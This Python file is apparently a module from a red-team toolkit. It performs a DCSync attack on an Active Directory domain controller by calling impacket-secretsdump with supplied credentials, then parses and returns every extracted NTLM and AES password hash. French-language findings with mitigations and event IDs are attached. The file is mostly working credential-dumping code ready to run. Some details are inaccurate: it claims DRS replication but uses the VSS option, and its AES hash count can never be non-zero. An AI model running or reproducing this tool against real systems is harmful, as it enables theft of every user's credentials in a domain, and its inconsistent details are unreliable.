"""
Red Team — DCSync Attack
=========================
Replicates the entire Active Directory database using the Directory Replication
Service (DRS), extracting all password hashes without ever logging in.

This is one of the most critical attacks — if successful, the attacker obtains
every user and computer password hash in the domain.

Requires: Domain Admin (or delegate with Replicate Changes permissions)

Uses: impacket-secretsdump with /TargetObject flag for DRS
"""

import subprocess
from datetime import datetime

from utils.format_utils import print_info, print_success, print_warning, print_error


def run_attack(target: str = None, domain: str = "domain.local", user: str = None,
               password: str = None, **kwargs) -> dict:
    """
    Execute DCSync attack to replicate AD credentials.

    Attempts to use the Directory Replication Service to extract the
    NTDS.dit database (all AD password hashes).
    """
    if not target or not domain or not user or not password:
        return _error("Paramètres requis: target, domain, user, password (DCSync nécessite des credentials).")

    print_warning(f"[RED TEAM] DCSync Attack → {target}")
    print_info(f"  Domain: {domain}")
    print_info(f"  Credentials: {user}")
    
    findings = []
    hashes_extracted = []
    
    try:
        # Step 1: Attempt DCSync with impacket-secretsdump
        print_info("Réplication de la base de données AD (DRS)...")
        
        cmd = [
            "impacket-secretsdump",
            f"{domain}/{user}:{password}@{target}",
            "-dc-ip", target,
            "-use-vss",  # Request Volume Shadow Copy for NTDS.dit
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        
        if result.returncode != 0:
            # Check if it's a permissions error or connectivity issue
            if "Access Denied" in result.stderr or "Insufficient access" in result.stderr:
                print_warning("Accès refusé — permissions insuffisantes pour DCSync.")
                findings.append({
                    "risk":        "Moyen",
                    "title":       "DCSync échoué — permissions insuffisantes",
                    "description": "L'utilisateur n'a pas les permissions de réplication AD.",
                    "mitigation":  "Vérifier les droits de réplication sur le compte ou le DC.",
                    "event_ids":   [4662],
                })
            else:
                print_error(f"secretsdump failed: {result.stderr[:200]}")
                return _error(f"DCSync error: {result.stderr[:200]}")
        
        # Parse hashes from output
        hashes_extracted = _parse_secretsdump_output(result.stdout)
        
        if hashes_extracted:
            print_success(f"  ✓ {len(hashes_extracted)} hash(es) extrait(s)")
            
            # Count by type
            ntlm_hashes = [h for h in hashes_extracted if h.get("type") == "NTLM"]
            aes_hashes = [h for h in hashes_extracted if h.get("type") == "AES"]
            
            findings.append({
                "risk":        "Critique",
                "title":       f"DCSync réussi — {len(hashes_extracted)} credential(s) compromis",
                "description": (
                    f"Base de données AD partiellement/entièrement répliquée. "
                    f"Extracted: {len(ntlm_hashes)} NTLM, {len(aes_hashes)} AES. "
                    f"Samples: " + ", ".join([h["username"] for h in hashes_extracted[:3]])
                ),
                "mitigation":  (
                    "1. Révoquer immédiatement tous les credentials. "
                    "2. Auditer qui a accès aux droits de réplication AD. "
                    "3. Activer Kerberos dans les configurations critiques."
                ),
                "event_ids":   [4662],  # Object access (replication)
            })
        else:
            print_warning("Aucun hash extrait (vérifier les droits/connectivité).")
            findings.append({
                "risk":        "Élevé",
                "title":       "DCSync partiellement échoué",
                "description": "Pas de hashes extraits — permissions insuffisantes ou DC inaccessible.",
                "mitigation":  "Vérifier les credentials et les droits de réplication.",
                "event_ids":   [4662],
            })
        
        return {
            "module":       "red_team.dcsync",
            "status":       "success" if hashes_extracted else "partial",
            "elapsed_s":    30.0,  # Approximation
            "timestamp":    datetime.now().isoformat(),
            "findings":     findings,
            "artifacts": {
                "ntds_hashes": hashes_extracted,
            },
            "summary": {
                "total_hashes_extracted": len(hashes_extracted),
                "domain_compromised": len(hashes_extracted) > 100,  # If many hashes, domain is compromised
            }
        }
    
    except FileNotFoundError:
        return _error("impacket-secretsdump not found. Install: pip install impacket")
    except subprocess.TimeoutExpired:
        return _error("secretsdump timeout — target unreachable or too slow.")
    except Exception as e:
        return _error(f"DCSync error: {str(e)}")


def _parse_secretsdump_output(output: str) -> list:
    """
    Parse secretsdump output for password hashes.
    
    Output format (NTLM):
        DOMAIN\\username:uid:lmhash:nthash:::
    
    Output format (Kerberos keys):
        username:aes256-cts-hmac-sha1-96:keyhash
    """
    hashes = []
    lines = output.split("\n")
    
    for line in lines:
        if ":" not in line:
            continue
        
        # NTLM hash format: domain\username:uid:lmhash:nthash:::
        if line.count(":") >= 3 and "\\" in line:
            try:
                parts = line.split(":")
                domain_user = parts[0]  # domain\username
                username = domain_user.split("\\")[-1] if "\\" in domain_user else domain_user
                
                # Extract NTLM hash (usually the 4th field)
                if len(parts) >= 4:
                    nt_hash = parts[3]
                    if len(nt_hash) == 32 and all(c in "0123456789abcdefABCDEF" for c in nt_hash):
                        hashes.append({
                            "username": username,
                            "hash":     nt_hash,
                            "type":     "NTLM",
                            "raw":      line[:100],
                        })
            except Exception:
                pass
        
        # AES key format: username:aes256-...:keyhash
        elif "aes256" in line.lower() or "aes128" in line.lower():
            try:
                parts = line.split(":")
                if len(parts) >= 3:
                    username = parts[0]
                    key_type = "AES256" if "aes256" in line.lower() else "AES128"
                    hashes.append({
                        "username": username,
                        "hash":     ":".join(parts[2:]),  # Rest is the key
                        "type":     key_type,
                        "raw":      line[:100],
                    })
            except Exception:
                pass
    
    return hashes


def _error(message: str) -> dict:
    """Build an error result."""
    print_error(message)
    return {
        "module":   "red_team.dcsync",
        "status":   "error",
        "message":  message,
        "findings": [{
            "risk":        "Critique",
            "title":       "DCSync échoué",
            "description": message,
            "mitigation":  "Vérifier les credentials et la connectivité au DC.",
            "event_ids":   [],
        }],
        "artifacts": {"ntds_hashes": []},
    }
